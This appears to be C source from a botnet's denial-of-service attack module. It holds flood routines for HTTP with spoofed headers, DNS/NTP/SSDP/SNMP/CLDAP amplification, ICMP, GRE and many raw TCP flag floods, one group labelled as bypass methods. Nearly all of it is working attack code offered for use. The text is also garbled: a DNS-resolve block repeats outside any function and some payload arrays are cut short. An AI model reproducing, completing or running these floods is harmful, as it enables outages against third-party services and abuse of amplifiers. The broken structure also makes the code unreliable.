                snprintf(req, sizeof(req), "GET %s%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nX-Forwarded-For: %s\r\nX-Real-IP: %s\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\n\r\n",
                    tpath, msqp[rand_next()%3], domain, l7ua[rand_next()%5], rip, rip);
            } else {
                char cv[256], pv[256];
                snprintf(cv,sizeof(cv),cachd[rand_next()%4],rand_next(),rand_next(),rand_next()&0xffff,rand_next()&0xffff);
                snprintf(pv,sizeof(pv),azhd[rand_next()%2],rand_next(),rand_next(),rand_next(),rand_next());
                snprintf(req, sizeof(req), "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nX-Forwarded-For: %s\r\nX-Real-IP: %s\r\n%s\r\n%s\r\n%s: %s\r\n\r\n",
                    meths[rand_next()%8], tpath, domain, l7ua[rand_next()%5], rip, rip, h2hd[rand_next()%4], cachd[rand_next()%4], azhd[rand_next()%2], cv);
            }
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd != -1) {
                fcntl(fd, F_SETFL, O_NONBLOCK);
                connect(fd, (struct sockaddr *)&sin, sizeof(sin));
                send(fd, req, strlen(req), MSG_NOSIGNAL);
                usleep(100 + (rand_next() % 400));
                close(fd);
            }
        }
    }

    resolv_entries_free(entries);
}

    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

void attack_dns_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                    int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 53;

    char dns_query[32] = {
        0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00
    };

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            dns_query[0] = (rand_next() >> 8) & 0xFF;
            dns_query[1] = rand_next() & 0xFF;
            sendto(fd, dns_query, sizeof(dns_query), 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

void attack_ntp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                    int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 123;

    char ntp_query[48] = {
        0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            sendto(fd, ntp_query, sizeof(ntp_query), 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

void attack_ssdp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                     int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 1900;

    char ssdp_query[] =
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 3\r\n"
        "ST: ssdp:all\r\n\r\n";

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            sendto(fd, ssdp_query, sizeof(ssdp_query) - 1, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

void attack_snmp_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                     int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 161;

    char snmp_query[] = {
        0x30, 0x26, 0x02, 0x01, 0x01, 0x04, 0x06, 0x70,
        0x75, 0x62, 0x6c, 0x69, 0x63, 0xa0, 0x19, 0x02
    };

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            sendto(fd, snmp_query, sizeof(snmp_query), 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

void attack_cldap_amp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 389;

    char cldap_query[] = {
        0x30, 0x29, 0x02, 0x01, 0x01, 0x63, 0x24, 0x04,
        0x00, 0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00, 0x02
    };

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            sendto(fd, cldap_query, sizeof(cldap_query), 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

/* =========================================================================
 * Layer 4 TCP Methods (ICMP, GRE)
 * ========================================================================= */

    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

void attack_icmp_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char icmp_packet[1500];
    struct iphdr *iph = (struct iphdr *)icmp_packet;
    struct icmphdr *icmph = (struct icmphdr *)(icmp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr));
    iph->id = rand_next();
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_ICMP;
    iph->check = 0;

    icmph->type = 8;  /* Echo request */
    icmph->code = 0;
    icmph->checksum = 0;
    icmph->un.echo.id = rand_next();
    icmph->un.echo.sequence = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            icmph->un.echo.sequence = rand_next();
            icmph->checksum = 0;
            icmph->checksum = checksum_icmp((uint16_t *)icmph, sizeof(struct icmphdr));

            sendto(fd, icmp_packet, sizeof(struct iphdr) + sizeof(struct icmphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

void attack_greip_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                        int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char gre_packet[1500];
    struct iphdr *outer_iph = (struct iphdr *)gre_packet;
    struct grehdr *gre = (struct grehdr *)(gre_packet + sizeof(struct iphdr));
    struct iphdr *inner_iph = (struct iphdr *)(gre_packet + sizeof(struct iphdr) + sizeof(struct grehdr));

    outer_iph->ihl = 5;
    outer_iph->version = 4;
    outer_iph->tos = 0;
    outer_iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr));
    outer_iph->id = rand_next();
    outer_iph->frag_off = 0;
    outer_iph->ttl = 64;
    outer_iph->protocol = 47;  /* GRE */
    outer_iph->check = 0;

    gre->flags = 0;
    gre->protocol = htons(0x0800);  /* IPv4 */

    inner_iph->ihl = 5;
    inner_iph->version = 4;
    inner_iph->tos = 0;
    inner_iph->tot_len = htons(sizeof(struct iphdr));
    inner_iph->id = rand_next();
    inner_iph->frag_off = 0;
    inner_iph->ttl = 64;
    inner_iph->protocol = IPPROTO_UDP;
    inner_iph->check = 0;

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        outer_iph->saddr = LOCAL_ADDR;
        outer_iph->daddr = sin.sin_addr.s_addr;
        outer_iph->check = 0;
        outer_iph->check = checksum_generic((uint16_t *)outer_iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            inner_iph->saddr = rand_next();
            inner_iph->daddr = sin.sin_addr.s_addr;
            inner_iph->check = 0;
            inner_iph->check = checksum_generic((uint16_t *)inner_iph, sizeof(struct iphdr));

            sendto(fd, gre_packet, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

void attack_greeth_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                         int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char gre_packet[1500];
    struct iphdr *outer_iph = (struct iphdr *)gre_packet;
    struct grehdr *gre = (struct grehdr *)(gre_packet + sizeof(struct iphdr));
    struct ethhdr *eth = (struct ethhdr *)(gre_packet + sizeof(struct iphdr) + sizeof(struct grehdr));

    outer_iph->ihl = 5;
    outer_iph->version = 4;
    outer_iph->tos = 0;
    outer_iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct ethhdr));
    outer_iph->id = rand_next();
    outer_iph->frag_off = 0;
    outer_iph->ttl = 64;
    outer_iph->protocol = 47;  /* GRE */
    outer_iph->check = 0;

    gre->flags = 0;
    gre->protocol = htons(0x6558);  /* Transparent Ethernet */

    memset(eth->h_dest, 0xFF, ETH_ALEN);  /* Broadcast */
    memset(eth->h_source, rand_next() & 0xFF, ETH_ALEN);
    eth->h_proto = htons(ETH_P_IP);

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        outer_iph->saddr = LOCAL_ADDR;
        outer_iph->daddr = sin.sin_addr.s_addr;
        outer_iph->check = 0;
        outer_iph->check = checksum_generic((uint16_t *)outer_iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            sendto(fd, gre_packet, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct ethhdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

/* =========================================================================
 * Layer 4 TCP Flood Methods
 * ========================================================================= */

void attack_syn_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->syn = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = 0;
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_ack_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->ack = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_fin_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->fin = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_rst_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->rst = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_psh_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->psh = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_urg_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->urg = TRUE;
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_ece_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    ((uint8_t *)tcph)[13] |= 0x40; /* ECE */
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

void attack_cwr_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    ((uint8_t *)tcph)[13] |= 0x80; /* CWR */
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

/* =========================================================================
 * New TCP Flood Methods (Useful Bypass Methods)
 * ========================================================================= */

    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

